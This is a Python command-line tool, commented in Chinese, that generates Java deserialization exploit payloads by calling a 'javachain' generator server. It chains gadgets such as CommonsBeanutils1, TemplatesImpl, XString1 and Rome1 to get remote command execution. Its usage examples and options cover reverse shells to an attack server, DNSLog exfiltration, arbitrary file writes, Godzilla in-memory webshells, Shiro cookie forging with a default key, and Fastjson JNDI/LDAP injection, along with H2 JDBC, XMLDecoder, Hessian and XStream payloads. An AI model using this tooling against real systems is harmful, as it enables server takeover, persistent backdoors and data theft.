import os
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
jchain.py — javachain 一键 payload 生成器（<your-attack-server>:8011）
=============================================================
把「手写 curl JSON 调 /api/generate」优化为按场景一条命令。

架构模型（javachain 三层）:
  载体(payload) → 触发链(gadget, tag校验强制连续) → 内置payload(BytecodeConvert级联50+种RCE)

用法:
  # 常用载体
  python jchain.py native  -c CB1 --exec "whoami"                    # Java原生反序列化字节流
  python jchain.py native  -c CCK1 --tomcat-echo                     # 带TomcatEcho回显
  python jchain.py native  -c CB1 --dnslog xxx.dnslog.cn             # DNSLog外带
  python jchain.py native  -c CCK1 --reverse-shell <your-attack-server> 4444 # 反弹shell
  python jchain.py native  -c CB1 --oneforall-echo --header X-Token  # 全容器通用回显
  python jchain.py native  -c CB1 --write-file /tmp/a.sock "b64..."  # 写文件
  python jchain.py native  -c CB1 --memshell --server Tomcat --pass x --key y  # 内存马(Godzilla)
  python jchain.py shiro   -k kPH+bIxk5D2deZiIxcaaaA== --exec "whoami"      # Shiro cookie
  python jchain.py fastjson --jndi ldap://<your-attack-server>:1389/Basic/Command/Base64/xxxx  # @type JSON
  python jchain.py jdbc-h2 --cmd "id"                                 # H2 恶意连接串
  python jchain.py xmldec  --cmd "id"                                 # XMLDecoder XML
  python jchain.py hessian -c XString1 --exec "whoami"                # Hessian2 字节流(必须XString1)
  python jchain.py xstream -c Rome1 --exec "whoami"                   # XStream XML

  # 辅助
  python jchain.py list [payload]    # 列载体 或 某载体的可用链
  python jchain.py params <gadget>   # 查某链参数
  python jchain.py raw -o out.bin    # 原生反序列化时另存原始字节流(便于直接POST)

  # 通用选项
  -o/--out 输出文件(二进制载体自动存)   -v 显示完整输出   --raw 打印base64解码后的原始字节
"""
import json, sys, base64, argparse, os
import urllib.request, http.cookiejar

BASE = os.environ.get("JC_URL", "http://<your-attack-server>:8011")
USER, PASS = os.environ.get("JCHAIN_USER","admin"), os.environ.get("JCHAIN_PASS","")

_cj = http.cookiejar.CookieJar()
_op = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(_cj),
    urllib.request.ProxyHandler({}))  # 直连, 不走本机代理
_op.addheaders = [("User-Agent", "Mozilla/5.0")]
_xsrf = None

def _post(path, obj=None):
    global _xsrf
    h = {"X-XSRF-TOKEN": _xsrf or ""}
    if obj is not None:
        h["Content-Type"] = "application/json"
        data = json.dumps(obj).encode()
    else:
        data = None
    req = urllib.request.Request(BASE + path, data=data, headers=h)
    return json.loads(_op.open(req).read().decode())

def login():
    global _xsrf
    _op.open(BASE + "/").read()
    _xsrf = [c.value for c in _cj if c.name == "XSRF-TOKEN"][0]
    r = _post("/auth/login", {"username": USER, "password": PASS})
    if r.get("code") != 0:
        sys.exit(f"登录失败: {r}")

def gen(payload_type, chain, encode="base64"):
    """chain: [{"gadget":..., "args":{...}}, ...] 首元素必须为载体本体"""
    r = _post("/api/generate", {"payload": {"type": payload_type, "encode": encode, "options": {}}, "chain": chain})
    if r.get("code") != 0:
        sys.exit(f"生成失败: {r.get('message') or json.dumps(r, ensure_ascii=False)}")
    return r["data"]

# ---------- 载体与链的构建 ----------
PAYLOAD_MAP = {
    "native":   "JavaNativePayload",
    "shiro":    "ShiroPayload",
    "fastjson": "FastjsonPayload",
    "jdbc-h2":  "JDBCPayload",
    "xmldec":   "XMLDecoderPayload",
    "hessian":  "Hessian2Payload",
    "xstream":  "XStreamPayload",
}

# 触发链默认: native/shiro 用 CB1(通用广泛), hessian 必须 XString1(toString触发)
DEFAULT_TRIGGER = {
    "native": "CommonsBeanutils1", "shiro": "CommonsBeanutils1",
    "hessian": "XString1", "xstream": "Rome1",
}

def _templates(bytecode_arg):
    """TemplatesImpl → 字节码来源(BytecodeConvert 或 BytecodeFromJavaSource)"""
    return [
        {"gadget": "TemplatesImpl", "args": {}},
        {"gadget": "BytecodeConvert", "args": {}},
        bytecode_arg,
    ]

def _exec_arg(cmd):
    return {"gadget": "Exec", "args": {"cmd": cmd}}

def _echo_arg(header, oneforall):
    g = "OneForAllEcho" if oneforall else "TomcatEcho"
    args = {"header": header}
    if oneforall:  # OneForAllEcho 才有 debug/once
        args.update({"debug": False, "once": False})
    return {"gadget": g, "args": args}

def _dns_arg(dom):
    return {"gadget": "DNSLog", "args": {"dnslog": dom}}

def _rev_arg(ip, port):
    return {"gadget": "ReverseShell", "args": {"ip": ip, "port": str(port)}}

def _write_arg(path, b64):
    return {"gadget": "WriteFileExec", "args": {"path": path, "b64": b64}}

def _memshell_arg(a):
    return {"gadget": "MemShellPartyGadget", "args": {
        "server": a.server, "serverVersion": "unknown", "shellType": a.shell_type,
        "shellTool": a.shell_tool, "pass": a.pass_, "key": a.key,
        "urlPattern": "/*", "headerName": "Accept",
        "debug": False, "probe": False, "byPassJavaModule": False,
        "staticInitialize": True, "shrink": True, "lambdaSuffix": False,
    }}

def _src_exec(cmd):
    """字节码源码命令执行(当链路不需要 BytecodeConvert 时)"""
    js_cmd = json.dumps(cmd)
    src = f"public class UserClass {{ static {{ try {{ Runtime.getRuntime().exec({js_cmd}); }} catch(Exception e) {{}} }} }}"
    return {"gadget": "BytecodeFromJavaSource", "args": {"sourceCode": src}}

# ---------- 场景构建 ----------
def build(a, trigger):
    pt = PAYLOAD_MAP[a.kind]
    hdr = [{"gadget": pt, "args": {}}]  # 首元素载体本体
    # 触发链 (hessian 需 XString1→RomeToStringBean1 中转; 其他直接接)
    if a.kind == "hessian":
        hdr += [{"gadget": "XString1", "args": {}}, {"gadget": "RomeToStringBean1", "args": {}}]
    elif trigger:
        hdr.append({"gadget": trigger, "args": {}})

    # 动作 → 内置payload
    if a.exec_cmd:
        tail = _templates(_exec_arg(a.exec_cmd))
    elif a.tomcat_echo:
        tail = _templates(_echo_arg(a.header, False))
    elif a.oneforall_echo:
        tail = _templates(_echo_arg(a.header, True))
    elif a.dnslog:
        tail = _templates(_dns_arg(a.dnslog))
    elif a.reverse_shell:
        tail = _templates(_rev_arg(a.rs_ip, a.rs_port))
    elif a.write_file:
        tail = _templates(_write_arg(a.write_path, a.write_b64))
    elif a.memshell:
        tail = _templates(_memshell_arg(a))
    else:
        # 无动作 → 直接字节码源码 exec
        tail = [{"gadget": "TemplatesImpl", "args": {}}, _src_exec("id")]

    # 特殊载体: 不走 TemplatesImpl 通用链, 直接 END 链
    if a.kind == "fastjson":
        hdr = [{"gadget": "FastjsonPayload", "args": {}},
               {"gadget": "FastjsonJdbcRowSetImpl", "args": {"jndiUrl": a.jndi, "fastjsonVersion": a.fastjson_ver}}]
        tail = []
    elif a.kind == "jdbc-h2":
        hdr = [{"gadget": "JDBCPayload", "args": {}},
               {"gadget": "H2JavaExecJdbc1", "args": {"cmd": a.exec_cmd or "id"}}]
        tail = []
    elif a.kind == "xmldec":
        hdr = [{"gadget": "XMLDecoderPayload", "args": {}},
               {"gadget": "XMLExec", "args": {"cmd": a.exec_cmd or "id"}}]
        tail = []
    elif a.kind == "shiro" and a.shiro_key:
        hdr[0] = {"gadget": "ShiroPayload", "args": {"shiroKey": a.shiro_key, "gcmMode": False, "dirtyLength": 0}}

    return pt, hdr + tail

BINARY_KINDS = ("native", "hessian")  # 二进制字节流载体 (encode=base64 真生效)

def show_output(data, args):
    out = data["output"]
    c = out.get("content", "")
    print(f"载体:{args.kind}  链:{data['meta'].get('chain','?')}")
    if args.kind in BINARY_KINDS:
        raw = base64.b64decode(c)
        if args.raw:
            sys.stdout.buffer.write(raw); sys.stdout.buffer.write(b"\n")
        else:
            print(f"字节流 {len(raw)}B, base64前{min(80,len(c))}字符: {c[:80]}")
            print(f"(加 --raw 看完整解码; 加 -o file.bin 存文件再POST)")
        if args.out:
            open(args.out, "wb").write(raw)
            print(f"已保存 {len(raw)}B → {args.out}")
    else:
        # 文本类明文 (fastjson JSON / JDBC URL / XML / Shiro cookie)
        print("---- payload ----")
        print(c)
        if args.out:
            open(args.out, "w", encoding="utf-8").write(c)
            print(f"已保存 → {args.out}")

def main():
    ap = argparse.ArgumentParser(prog="jchain.py", add_help=False,
        formatter_class=argparse.RawDescriptionHelpFormatter, description=__doc__)
    ap.add_argument("kind", nargs="?", choices=list(PAYLOAD_MAP)+["list","params","raw"])
    ap.add_argument("rest", nargs="*")
    ap.add_argument("-c","--chain", default=None)
    ap.add_argument("-k","--shiro-key", default=None)
    ap.add_argument("--exec", dest="exec_cmd", default=None)
    ap.add_argument("--tomcat-echo", action="store_true")
    ap.add_argument("--oneforall-echo", action="store_true")
    ap.add_argument("--header", default="X-Authorization")
    ap.add_argument("--dnslog", default=None)
    ap.add_argument("--reverse-shell", nargs=2, metavar=("IP","PORT"), default=None)
    ap.add_argument("--write-file", nargs=2, metavar=("PATH","B64"), default=None)
    ap.add_argument("--memshell", action="store_true")
    ap.add_argument("--server", default="Tomcat")
    ap.add_argument("--shell-type", default="Listener")
    ap.add_argument("--shell-tool", default="Godzilla")
    ap.add_argument("--pass", dest="pass_", default="pass")
    ap.add_argument("--key", dest="key", default="key")
    ap.add_argument("--jndi", default="ldap://<your-attack-server>:1389/Basic/Command/Base64/d2hvYW1p")
    ap.add_argument("--fastjson-ver", default="1.2.47", choices=["1.2.24","1.2.47"])
    ap.add_argument("-o","--out", default=None)
    ap.add_argument("--raw", action="store_true")
    ap.add_argument("-v", action="store_true")
    args = ap.parse_args()

    login()

    if not args.kind:
        ap.print_help(); return
    if args.kind == "list":
        if args.rest:
            g = _post("/api/gadgets/starts?payload=" + args.rest[0])
            print(f"{args.rest[0]} 可用链 ({len(g['data'])}):")
            for x in g["data"]: print("  ", x)
        else:
            g = _post("/api/payloads")
            for p in g["data"]: print(f"  {p['key']:32s} {p['name']}")
        return
    if args.kind == "params":
        g = _post("/api/gadgets/" + args.rest[0])["data"]
        print(f"=== {args.rest[0]} tags={g.get('tags')} ===")
        for p in g.get("params", []):
            print(f"  [{'REQ' if p.get('required') else 'opt'}] {p.get('fieldName')}={p.get('value')}")
        if g.get("nextGadgets"): print("  next:", g["nextGadgets"])
        return
    if args.kind == "raw":
        # raw: 原生反序列化任意字节码 payload 存文件
        pt = PAYLOAD_MAP["native"]
        src = _src_exec(args.exec_cmd or "id")
        trigger = args.chain or DEFAULT_TRIGGER["native"]
        chain = [{"gadget": pt, "args": {}}, {"gadget": trigger, "args": {}},
                 {"gadget": "TemplatesImpl", "args": {}}, src]
        data = gen(pt, chain)
        out = data["output"]
        raw = base64.b64decode(out["content"])
        fn = args.out or "payload.bin"
        open(fn, "wb").write(raw)
        print(f"已生成 {len(raw)}B → {fn}")
        return

    # 场景生成
    args.kind = args.kind
    args.rs_ip, args.rs_port = (args.reverse_shell or (None,None))
    args.write_path, args.write_b64 = (args.write_file or (None,None))
    args.kind_map = args.kind
    pt, chain = build(args, args.chain or DEFAULT_TRIGGER.get(args.kind))
    data = gen(pt, chain)
    if args.v:
        print(json.dumps(data["meta"], ensure_ascii=False, indent=1))
    show_output(data, args)

if __name__ == "__main__":
    main()
